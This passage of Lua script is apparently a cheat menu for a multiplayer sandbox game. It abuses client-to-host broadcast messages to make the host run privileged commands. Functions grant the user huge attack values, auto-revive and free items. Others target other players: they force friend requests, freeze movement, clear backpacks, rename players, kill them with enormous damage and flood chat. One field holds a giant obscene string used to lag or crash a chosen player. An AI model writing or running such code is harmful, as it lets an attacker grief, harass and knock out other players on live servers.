            inviterName = "\n\n\n\n\n#R操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈操你妈",
            beInvitedUin = uin
        }
        SandboxLuaMsg.sendToHost("TELEPORT_SEND_INVITE_TOHOST", content)
    end, "指定卡人")
end

function tjzd()
    if ClientCurGame:isInGame() then
        local content = { role_id = AccountManager:getUin(), itemid = 15056, itemnum = 999 }
        SandboxLuaMsg.sendToHost("DEVELOPERSTORE_EXTRASTOREITEM_TOHOST", content)
        ShowGameTipsWithoutFilter("#cFF7aad部分房间用不了")
    else
        ShowGameTipsWithoutFilter("#cFF7aad请先进入房间")
    end
end

function jjzd()
    if ClientCurGame:isInGame() then
        BanItem(15056)
        getglobal("MItemTipsFrame"):Hide()
        ShowGameTipsWithoutFilter("#cFF7aad部分房间用不了")
    else
        ShowGameTipsWithoutFilter("#cFF7aad请先进入房间")
    end
end

function gbfj()
    if ClientCurGame:isInGame() then
        local tdata = { teamid = 1, result = 1 }
        ScriptSupportTask:reportTaskToHost(SSTASKID.TEAM_RESULTS, tdata)
        ShowGameTipsWithoutFilter("#cFF7aad部分房间用不了")
    else
        ShowGameTipsWithoutFilter("#cFF7aad请先进入房间")
    end
end

function gbtq()
    if ClientCurGame:isInGame() then
        local tdata = {
            [1] = "gamerule",
            [2] = "setWeather",
            [3] = { 5 }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        ShowGameTipsWithoutFilter("#cFF7aad部分房间用不了")
    else
        ShowGameTipsWithoutFilter("#cFF7aad请先进入房间")
    end
end


function dtly()
-- 获取玩家当前位置作为中心点
local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
local center_x, center_y, center_z = x / 100, y / 100, z / 100

-- 球体半径
local radius = 10

-- 外层岩浆半径（比球体大2格）
local outer_radius = radius + 2

-- 最外层空气墙半径（比岩浆大3格）
local airwall_radius = outer_radius + 3


-- 第一步：生成内层空心球体（1221）
for ix = -radius, radius do
    for iy = -radius, radius do
        for iz = -radius, radius do
            local dist = math.sqrt(ix*ix + iy*iy + iz*iz)
            if dist >= radius - 0.5 and dist <= radius + 0.5 then
                local tdata = {
                    [1] = "block",
                    [2] = "placeBlock",
                    [3] = { 1221, center_x + ix, center_y + iy, center_z + iz, 0, -1 }
                }
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
            end
        end
    end
end

-- 第二步：生成中层岩浆包裹层（5）
for ix = -outer_radius, outer_radius do
    for iy = -outer_radius, outer_radius do
        for iz = -outer_radius, outer_radius do
            local dist = math.sqrt(ix*ix + iy*iy + iz*iz)
            if dist >= outer_radius - 0.5 and dist <= outer_radius + 0.5 then
                local tdata = {
                    [1] = "block",
                    [2] = "placeBlock",
                    [3] = { 5, center_x + ix, center_y + iy, center_z + iz, 0, -1 }
                }
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
            end
        end
    end
end

-- 第三步：生成最外层空气墙（1001）
for ix = -airwall_radius, airwall_radius do
    for iy = -airwall_radius, airwall_radius do
        for iz = -airwall_radius, airwall_radius do
            local dist = math.sqrt(ix*ix + iy*iy + iz*iz)
            if dist >= airwall_radius - 0.5 and dist <= airwall_radius + 0.5 then
                local tdata = {
                    [1] = "block",
                    [2] = "placeBlock",
                    [3] = { 1001, center_x + ix, center_y + iy, center_z + iz, 0, -1 }
                }
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
            end
        end
    end
end

-- 第四步：在单挑领域附近循环播放闪电（增强版）
ShowGameTipsWithoutFilter("#c00ff00开始在领域附近循环播放闪电...")

threadpool:work(function()
    -- 生成36个闪电位置（球面分布）
    local lightning_positions = {}
    
    -- 生成多圈不同高度的闪电
    for radius_mult = 1, 3 do  -- 3圈不同距离
        local current_radius = airwall_radius + 3 + radius_mult * 2
        
        for angle1 = 0, 360, 30 do  -- 水平方向每30度一个
            for angle2 = -60, 60, 30 do  -- 垂直方向每30度一个
                local rad1 = math.rad(angle1)
                local rad2 = math.rad(angle2)
                
                local px = center_x + current_radius * math.cos(rad1) * math.cos(rad2)
                local py = center_y + current_radius * math.sin(rad2) + 5  -- 抬高5米
                local pz = center_z + current_radius * math.sin(rad1) * math.cos(rad2)
                
                table.insert(lightning_positions, {x = px, y = py, z = pz})
            end
        end
    end
    
    -- 添加一些随机位置的闪电
    for i = 1, 20 do
        local random_angle = math.random(0, 360)
        local random_height = math.random(-10, 20)
        local random_radius = airwall_radius + math.random(2, 8)
        
        local rad = math.rad(random_angle)
        local px = center_x + random_radius * math.cos(rad)
        local py = center_y + random_height
        local pz = center_z + random_radius * math.sin(rad)
        
        table.insert(lightning_positions, {x = px, y = py, z = pz})
    end
    
    ShowGameTipsWithoutFilter("#c00ff00共生成 " .. #lightning_positions .. " 个闪电位置")
    
    local index = 1
    while true do
        -- 同时播放多个闪电（增加密度）
        for i = 1, 5 do  -- 每次同时播放5个闪电
            local pos_index = (index + i * 7) % #lightning_positions + 1
            local pos = lightning_positions[pos_index]
            
            -- 随机大小和持续时间
            local scale = math.random(2, 5)
            local duration = math.random(15, 25)
            
            CurWorld:playSoundAndParticleEffect(
                pos.x, pos.y, pos.z, 0, 0, 0, 0,
                pos.x, pos.y, pos.z,
                'particles/aotu_06_leishenzhichui.ent', scale, duration
            )
        end
        
        index = index + 1
        if index > #lightning_positions then
            index = 1
        end
        
        threadpool:wait(0.05)  -- 更快频率
    end
end)

end


   
   
function cggj()
    if ClientCurGame:isInGame() then
        local tdata = {
            [1] = "player",
            [2] = "setAtt",
            [3] = { AccountManager:getUin(), 99999999, 17 }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        ShowGameTipsWithoutFilter("#cFF7aad部分房间用不了")
    else
        ShowGameTipsWithoutFilter("#cFF7aad请先进入房间")
    end
end

function jdfk(aa)
    local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
    local new_x, new_y, new_z = x / 100, (y / 100) - 1, z / 100
    local tdata = {
        [1] = "block",
        [2] = "placeBlock",
        [3] = { 1, new_x, new_y, new_z, 0, -1 }
    }
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end

function jdfk_all(aa)
    ShowGameTipsWithoutFilter('#cFF7aad开启成功')
    jdfk_all_1 = true
    threadpool:work(function()
        while true do
            if not ClientCurGame:isInGame() then
                ShowGameTipsWithoutFilter("#cFF7aad请先进入房间")
                break
            end
            jdfk(aa)
            threadpool:wait(0.1)
            if not jdfk_all_1 then
                ShowGameTipsWithoutFilter("#cFF7aad关闭成功")
                break
            end
        end
    end)
end



function wjgr()
GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
-- 跟随功能（左停止，右开启选择目标跟随自己）
GetInst("MessageBoxInterface"):dualBtnBox(
    "Trái: Ngừng theo dõi\nPhải: Bắt đầu theo dõi và chọn mục tiêu",
    "跟随功能",
    nil,
    function(userData, btnType)
        if btnType == 0 then  -- 左侧：停止跟随
            _G.follow_enabled = false
            ShowGameTipsWithoutFilter("#cFF0000跟随已关闭")
            -- 恢复所有人移动权限
            threadpool:work(function()
                threadpool:wait(0.5)
                if not _G.follow_enabled then
                    local num = ClientCurGame:getNumPlayerBriefInfo()
                    for i = 1, num do
                        local briefInfo = ClientCurGame:getPlayerBriefInfo(i - 1)
                        if briefInfo and briefInfo.uin and briefInfo.uin > 1000 then
                            local tdata = {}
                            tdata[1] = "player"
                            tdata[2] = "setActionAttrState"
                            tdata[3] = {briefInfo.uin, 1, true}
                            pcall(function()
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                            end)
                        end
                    end
                    ShowGameTipsWithoutFilter("#c00ffffKhả năng di chuyển toàn diện của người chơi đã được khôi phục")
                end
            end)

        elseif btnType == 1 then  -- 右侧：开启跟随
            _G.follow_enabled = true
            -- 判断是否在游戏内
            if not ClientCurGame or not ClientCurGame:isInGame() then
                ShowGameTipsWithoutFilter("#cFF0000Vui lòng vào phòng chơi trước")
                _G.follow_enabled = false
                return
            end

            LoadHomelandLuas()
            local uin_list = GetPlayerUinList()
            if #uin_list == 0 then
                ShowGameTipsWithoutFilter("#cFF0000Không có người chơi nào khác trong phòng")
                _G.follow_enabled = false
                return
            end

            -- 玩家列表UI配置
            local data = {
                visit = {
                    history_num = "Chọn mục tiêu để theo dõi",
                    today_num = "#cFF7aad" .. #uin_list
                },
                event_home = {{param1 = 0, event_id = 5, event_time = 0}},
                event_visit = {}
            }
            for i = 1, #uin_list do
                data.event_visit[i] = {uin = uin_list[i], event_id = 5, event_time = 0}
            end

            GetInst("UIManager"):Open("HomeEventRecord")
            GetInst("UIManager"):GetCtrl("HomeEventRecord"):UpdateUI(data)
            getglobal("HomeEventRecordTitleFrameName"):SetText("Chọn người chơi bạn muốn theo dõi")
            getglobal("HomeEventRecordTodayVisterText"):SetText("#cFF7aadDanh sách người chơi")
            getglobal("HomeEventRecordTotalVisterText"):SetText("#cFF7aadNhấp để xác nhận nội dung sau")

            local ctrl = GetInst("UIManager"):GetCtrl("HomeEventRecord")
            local originalFunc = ctrl.EnterFriendHomeBtn_OnClick
            function ctrl:EnterFriendHomeBtn_OnClick()
                GetInst("UIManager"):Close("HomeEventRecord")
                ctrl.EnterFriendHomeBtn_OnClick = originalFunc
                local targetUin = this:GetClientID()

                -- 白名单拦截

                ShowGameTipsWithoutFilter("#c00ffff已选中玩家"..targetUin.."，Kiên trì theo đuổi con đường của riêng mình")
                -- 跟随循环线程
                threadpool:work(function()
                    while _G.follow_enabled do
                        -- 获取自身坐标
                        local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
                        local new_x = x / 100
                        local new_y = y / 100
                        local new_z = z / 100
                        -- 导航跟随指令
                        local tdata = {}
                        tdata[1] = "actor";
                        tdata[2] = "tryNavigationToPos";
                        tdata[3] = {targetUin,new_x,new_y,new_z,true,true}
                        pcall(function()
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                        end)

                        threadpool:wait(0.1)
                    end
                    ShowGameTipsWithoutFilter("#cFF0000Vòng lặp theo dõi đã kết thúc")
                end)
            end
        end
    end
)
end

function qzhy()
    ShowPlayerList(function(uin)
     if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("#R禁止对VIP使用此功能", 3)
        else
            ShowGameTips("#R禁止对VIP使用此功能", 3)
        end
        return
    end
        local tdata = {
            [1] = "player",
            [2] = "SendFriendApply",
            [3] = { uin, AccountManager:getUin() }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end, "强制好友")
end

function sqfw()
    if ClientCurGame:isInGame() then
        local tdata = {
            [1] = "player",
            [2] = "setCheckBoxScale",
            [3] = { AccountManager:getUin(), 1000 }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        ShowGameTipsWithoutFilter("#cFF7aad部分房间用不了")
    else
        ShowGameTipsWithoutFilter("#cFF7aad请先进入房间")
    end
end

function qswj()
    ShowPlayerList(function(uin)
     if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("#R禁止对VIP使用此功能", 3)
        else
            ShowGameTips("#R禁止对VIP使用此功能", 3)
        end
        return
    end
        local tdata = {
            [1] = "player",
            [2] = "mountActor",
            [3] = { AccountManager:getUin(), uin, -1 }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end, "骑上玩家")
end


function pbsw()
-- 获取死亡界面整套MVC
local DeathFrameCtrl, DeathFrameModel, DeathFrameView = GetInst("MiniUIManager"):GetMVC("DeathFrameAutoGen")

-- 死亡弹窗拦截统一回调
local function BlockDeathUI()
    -- 关闭死亡界面容器
    GetInst("MiniUIManager"):CloseUI("DeathFrameAutoGen")
    -- 可选弹出提示，不需要可以删掉
    ShowGameTipsWithoutFilter("#R已屏蔽死亡弹窗")
end

-- 重写死亡事件分发入口，拦截弹出逻辑
local Old_FGUIHandleEvent = DeathFrameCtrl.FGUIHandleEvent
function DeathFrameCtrl:FGUIHandleEvent(eventName)
    -- 捕获主角死亡事件直接拦截
    if eventName == "GE_MAINPLAYER_DIE" then
        -- 延迟极短时间，循环两次发送改血广播
        threadpool:delay(0.00000001, function()
            -- 循环2次发送setAtt指令
            for i = 1, 2 do
                local tdata = {}
                tdata[1] = "player";
                tdata[2] = "setAtt";
                tdata[3] = {AccountManager:getUin(),5201314,2}
                -- 向宿主广播任务消息
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
            end
        end)
        
        BlockDeathUI()
        return
    end
    -- 其余事件保留原有逻辑正常执行
    return Old_FGUIHandleEvent(self, eventName)
end

-- 额外兜底：重写界面刷新前置方法，就算界面要创建也直接拦截
local Old_BeforeRefresh = DeathFrameCtrl.BeforeRefresh
function DeathFrameCtrl:BeforeRefresh()
    BlockDeathUI()
    return Old_BeforeRefresh(self)
end
end

function dffz()
    local myUin = AccountManager:getUin()
    
                -- ===== Sử dụng danh sách trắng toàn cục theo ý bạn =====
                if whitelist == nil then
                    whitelist = {}
                end

    local size = ClientCurGame:requireArrayOfPlayers(-1, -1)
    for i = 1, size do
        local targetPlayer = ClientCurGame:getIthPlayerInArray(i - 1)
        if targetPlayer then
            local targetUin = targetPlayer:getUin()
            -- Kiểm tra nếu targetUin khác bản thân VÀ không nằm trong whitelist
            if targetUin ~= myUin and not whitelist[targetUin] then
                local tdata = {}
                tdata[1] = "player";
                tdata[2] = "changPlayerMoveType";
                tdata[3] = {targetUin, 0}
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                
                tdata = {}
                tdata[1] = "world";
                tdata[2] = "SetTimeVanishingSpeed";
                tdata[3] = {500}
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                
                tdata = {}
                tdata[1] = "player";
                tdata[2] = "changeViewMode";
                tdata[3] = {targetUin, 9, true}
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)  
                
                tdata = {}
                tdata[1] = "player";
                tdata[2] = "forceOpenBoxUI";
                tdata[3] = {targetUin, 797}
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                tdata = {}
                tdata[1] = "player";
                tdata[2] = "forceOpenBoxUI";
                tdata[3] = {targetUin, 798}
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                tdata = {}
                tdata[1] = "player";
                tdata[2] = "forceOpenBoxUI";
                tdata[3] = {targetUin, 798}
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                
                tdata = {}
                tdata[1] = "actor";
                tdata[2] = "changeCustomModel";
                tdata[3] = {targetUin, [=[role_11]=]}
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                
                tdata = {}
                tdata[1] = "chat";
                tdata[2] = "sendChat";
                tdata[3] = {"#b#BKinh Vô Tâm Thái Sơ\n#b#BKinh Vô Tâm Thái Sơ\n#b#BKinh Vô Tâm Thái Sơ\n#b#BKinh Vô Tâm Thái Sơ\n#b#BKinh Vô Tâm Thái Sơ\n#b#BKinh Vô Tâm Thái Sơ\n#b#BKinh Vô Tâm Thái Sơ\n#b#BKinh Vô Tâm Thái Sơ\n#b#BKinh Vô Tâm Thái Sơ\n", 1, 0}
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                
                tdata = {}
                tdata[1] = "player";
                tdata[2] = "notifyGameInfo2Self";
                tdata[3] = {targetUin, "#b#BKinh Vô Tâm Thái Sơ"}
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                
                tdata = {}
                tdata[1] = "actor";
                tdata[2] = "setnickname";
                tdata[3] = {targetUin, "#b#KLệnh cấm Vô Tâm"}
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                
                tdata = {}
                tdata[1] = "backpack";
                tdata[2] = "clearAllPack";
                tdata[3] = {targetUin}
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                
                tdata = {}
                tdata[1] = "player";
                tdata[2] = "setActionAttrState";
                tdata[3] = {targetUin, 1, false}
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                
                if myUin then
                    tdata = {}
                    tdata[1] = "player";
                    tdata[2] = "setActionAttrState";
                    tdata[3] = {myUin, 64, false}
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                    
                    tdata = {}
                    tdata[1] = "player";
                    tdata[2] = "setActionAttrState";
                    tdata[3] = {myUin, 128, false}
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                end
                
                tdata = {}
                tdata[1] = "world";
                tdata[2] = "SetSkyBoxMaps";
                tdata[3] = {1, 30008, ""}
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                
                if myUin then
                    tdata = {}
                    tdata[1] = "actor";
                    tdata[2] = "playerHurt";
                    tdata[3] = {myUin, targetUin, 1.8e+308, 0}
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                end
                
                tdata = {}
                tdata[1] = "player";
                tdata[2] = "setAtt";
                tdata[3] = {targetUin, 1, 2}
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                
                tdata = {}
                tdata[1] = "actor";
                tdata[2] = "playBodyEffectByFile";
                tdata[3] = {myUin, "yanhua", true}
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                
                tdata = {}
                tdata[1] = "actor";
                tdata[2] = "playBodyEffectByFile";
                tdata[3] = {myUin, "12834", true}
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                
                tdata = {}
                tdata[1] = "actor";
                tdata[2] = "playBodyEffectByFile";
                tdata[3] = {myUin, "bossskill_lasertailblue", true}
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                
                tdata = {}
                tdata[1] = "actor";
                tdata[2] = "playBodyEffectByFile";
                tdata[3] = {myUin, "ice_bingshi_boss", true}
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                
                tdata = {}
                tdata[1] = "actor";
                tdata[2] = "playBodyEffectByFile";
                tdata[3] = {myUin, "mob_3514_white", true}
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                
                tdata = {}
                tdata[1] = "actor";
                tdata[2] = "playBodyEffectByFile";
                tdata[3] = {myUin, "nengliang_xiqu", true}
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                
                tdata = {}
                tdata[1] = "actor";
                tdata[2] = "playBodyEffectByFile";
                tdata[3] = {myUin, "nengliang_baozha", true}
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                
                tdata = {}
                tdata[1] = "actor";
                tdata[2] = "playBodyEffectByFile";
                tdata[3] = {targetUin, "jiguang01", true}
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
            end
        end
    end
end

function dffzgt()
    local myUin = AccountManager:getUin()
    
    -- ===== Sử dụng danh sách trắng toàn cục theo ý bạn =====
    if whitelist == nil then
        whitelist = {}
    end

    local size = ClientCurGame:requireArrayOfPlayers(-1, -1)
    for i = 1, size do
        local targetPlayer = ClientCurGame:getIthPlayerInArray(i - 1)
        if targetPlayer then
            local targetUin = targetPlayer:getUin()
            -- Kiểm tra nếu targetUin khác bản thân VÀ không nằm trong whitelist
            if targetUin ~= myUin and not whitelist[targetUin] then
                local tdata = {}
                tdata[1] = "player";
                tdata[2] = "changPlayerMoveType";
                tdata[3] = {targetUin, 0}
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                
                tdata = {}
                tdata[1] = "world";
                tdata[2] = "SetTimeVanishingSpeed";
                tdata[3] = {500}
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                
                tdata = {}
                tdata[1] = "player";
                tdata[2] = "changeViewMode";
                tdata[3] = {targetUin, 9, true}
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)  
                
                tdata = {}
                tdata[1] = "player";
                tdata[2] = "forceOpenBoxUI";
                tdata[3] = {targetUin, 797}
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                tdata = {}
                tdata[1] = "player";
                tdata[2] = "forceOpenBoxUI";
                tdata[3] = {targetUin, 798}
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                tdata = {}
                tdata[1] = "player";
                tdata[2] = "forceOpenBoxUI";
                tdata[3] = {targetUin, 798}
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                
                tdata = {}
                tdata[1] = "actor";
                tdata[2] = "changeCustomModel";
                tdata[3] = {targetUin, [=[role_11]=]}
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                
                tdata = {}
                tdata[1] = "chat";
                tdata[2] = "sendChat";
                tdata[3] = {"#c99FFFF英雄挺身而出，为正义而战。\n#c99FFFF英雄挺身而出，为正义而战。\n#c99FFFF英雄挺身而出，为正义而战。\n#c99FFFF英雄挺身而出，为正义而战。\n#c99FFFF英雄挺身而出，为正义而战。\n#c99FFFF英雄挺身而出，为正义而战。\n#c99FFFF英雄挺身而出，为正义而战。\n#c99FFFF英雄挺身而出，为正义而战。\n#c99FFFF英雄挺身而出，为正义而战。\n", 1, 0}
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                
                tdata = {}
                tdata[1] = "player";
                tdata[2] = "notifyGameInfo2Self";
                tdata[3] = {targetUin, "#c000033为#c000066什#c000088么#c0000AA要#c0000CC身#c0000FF处#c0044FF神#c0088FF圣#c00BBFF之#c33DDFF地#c66EEFF？"}
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                
                tdata = {}
                tdata[1] = "actor";
                tdata[2] = "setnickname";
                tdata[3] = {targetUin, "#c99FFCC对不起"}
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                
                tdata = {}
                tdata[1] = "backpack";
                tdata[2] = "clearAllPack";
                tdata[3] = {targetUin}
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                
                tdata = {}
                tdata[1] = "player";
                tdata[2] = "setActionAttrState";
                tdata[3] = {targetUin, 1, false}
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                
                if myUin then
                    tdata = {}
                    tdata[1] = "player";
                    tdata[2] = "setActionAttrState";
                    tdata[3] = {myUin, 64, false}
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                    
                    tdata = {}
                    tdata[1] = "player";
                    tdata[2] = "setActionAttrState";
                    tdata[3] = {myUin, 128, false}
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                end
                
                -- ===== ĐÃ THAY THẾ LỆNH SKY MỚI Ở ĐÂY =====
                tdata = {}
                tdata[1] = "world";
                tdata[2] = "SetSkyBoxTemplate";
                tdata[3] = {5}
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                
                tdata = {}
                tdata[1] = "world";
                tdata[2] = "SetSkyBoxFilter";
                tdata[3] = {0, 10, 4}
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                -- ==========================================
                
                if myUin then
                    tdata = {}
                    tdata[1] = "actor";
                    tdata[2] = "playerHurt";
